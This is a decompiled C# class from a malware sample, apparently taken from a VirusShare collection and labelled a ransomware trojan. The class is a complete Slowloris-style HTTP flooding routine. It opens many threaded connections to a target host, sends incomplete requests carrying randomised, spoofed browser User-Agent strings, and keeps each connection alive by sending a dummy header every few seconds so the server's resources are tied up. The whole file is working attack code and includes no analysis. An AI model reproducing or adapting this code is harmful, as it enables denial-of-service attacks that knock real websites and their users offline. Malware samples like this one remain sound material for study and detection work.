// Decompiled with JetBrains decompiler
// Type: insomnia.Class36
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 848092D5-5192-4B4F-B8F0-07AD40D025FA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.exyo-803dbe7f976d166aef05102db1219065c8b0bb78e3cf85095fc361f891e6a4e0.exe

using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace insomnia
{
  internal class Class36
  {
    private static ThreadStart[] Field9;
    private static Thread[] Field8;
    public static string Field7;
    private static IPEndPoint Field6;
    public static int Field5;
    public static int Field4;
    public static bool Field3 = false;
    public static string[] Field2 = new string[10]
    {
      "Mozilla/3.0 ",
      "Mozilla/3.1 ",
      "Mozilla/3.6 ",
      "Mozilla/4.0 ",
      "Mozilla/4.08 ",
      "Mozilla/5.0 ",
      "Opera/9.33 ",
      "Opera/9.0 ",
      "Opera/8.90 ",
      "Opera/9.80 "
    };
    public static string[] Field1 = new string[28]
    {
      "(compatible; MSIE 6.0; Windows NT)",
      "(Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9b5) Gecko/2008032619 Firefox/3.0b5",
      "(Windows; U; Windows NT 5.1; en-US; rv:1.8.0.5) Gecko/20060731 Firefox/1.5.0.5 Flock/0.7.4.1 ",
      "(MobilePhone SCP-5500/US/1.0) NetFront/3.0 MMP/2.0 (compatible; Googlebot/2.1; http://www.google.com/bot.html)",
      "[en] (WinNT; U)",
      "(compatible; MSIE 7.0; Windows NT 5.1; bgft) ",
      "(compatible; MSIE 6.0; Win32)",
      "(X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",
      "(X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801",
      "(SunOS 5.8 sun4u; U) Opera 5.0 [en]",
      "(compatible; Googlebot/2.1; http://www.google.com/bot.html)  ",
      "(X11; U; Linux i686; en-US; rv:1.8) Gecko/20051111 Firefox/1.5 BAVM/1.0.0",
      "(X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8 ",
      "(Windows; U; Windows NT 6.1; it; rv:1.9.2) Gecko/20100115 Firefox/3.6",
      "Galeon/1.2.0 (X11; Linux i686; U;) Gecko/20020326",
      "(Windows NT 5.1; U; en) Presto/2.5.22 Version/10.50",
      "(Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10",
      "(X11; Linux x86_64; U; Linux Mint; en) Presto/2.2.15 Version/10.10",
      "(Macintosh; PPC Mac OS X; U; en) Opera 8.0",
      "(Windows; U; Windows NT 5.1; en-US; rv:0.9.6) Gecko/20011128",
      "(Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
      "(iPhone; U; CPU like Mac OS X; en) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/4A93 Safari/419.3",
      "(compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET CLR 4.0.20402; MS-RTC LM 8)",
      "(Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
      "(compatible; MSIE 6.1; Windows XP; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
      "(compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)",
      "(compatible; MSIE 6.1; Windows XP)",
      "(Windows; U; Windows NT 6.1; nl; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3"
    };

    public static string Method6() => Class36.Field2[Class39.Method12(0, Class36.Field2.Length)] + Class36.Field1[Class39.Method12(0, Class36.Field1.Length)];

    public static string Method5() => Class39.Method12(0, 10) < 5 ? "GET" : "POST";

    public static void Method4()
    {
      try
      {
        Class36.Field6 = new IPEndPoint(Dns.GetHostEntry(Class36.Field7).AddressList[0], Class36.Field4);
      }
      catch
      {
        Class36.Field6 = new IPEndPoint(IPAddress.Parse(Class36.Field7), Class36.Field4);
      }
      Class36.Field8 = new Thread[Class36.Field5];
      Class36.Field9 = new ThreadStart[Class36.Field5];
      for (int index = 0; index < Class36.Field5; ++index)
      {
        Class36.Field9[index] = new ThreadStart(Class36.Method2);
        Class36.Field8[index] = new Thread(Class36.Field9[index]);
        Class36.Field8[index].Start();
      }
    }

    public static void Method3()
    {
      for (int index = 0; index < Class36.Field5; ++index)
      {
        try
        {
          Class36.Field8[index].Suspend();
        }
        catch
        {
        }
      }
    }

    public static void Method2()
    {
      Thread.Sleep(Class39.Method12(2000, 10000));
      try
      {
        Class36.Method6();
        byte[] bytes1 = Encoding.UTF8.GetBytes(string.Format("{0} {1} HTTP/1.1\r\nHost: {2}\r\nUser-Agent: {3}\r\nContent-Length: {4}\r\n", (object) Class36.Method5(), (object) ("/?" + (object) Class39.Method12(1, 99999999)), (object) Class36.Field7, (object) Class36.Method6(), (object) Class39.Method12(10, 999)));
        Socket socket = Class36.Method1(Class36.Field6.Address.ToString(), Class36.Field4);
        socket.Send(bytes1, bytes1.Length, SocketFlags.None);
        while (true)
        {
          Thread.Sleep(Class39.Method12(10000, 15000));
          byte[] bytes2 = Encoding.UTF8.GetBytes("X-a: b\r\n");
          socket.Send(bytes2, bytes2.Length, SocketFlags.None);
        }
      }
      catch
      {
        Class36.Method2();
      }
    }

    public static Socket Method1(string A_0, int A_1)
    {
      Socket socket1 = (Socket) null;
      foreach (IPAddress address in Dns.GetHostEntry(A_0).AddressList)
      {
        IPEndPoint remoteEP = new IPEndPoint(address, A_1);
        Socket socket2 = new Socket(remoteEP.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
        socket2.Connect((EndPoint) remoteEP);
        if (socket2.Connected)
        {
          socket1 = socket2;
          break;
        }
      }
      return socket1;
    }
  }
}
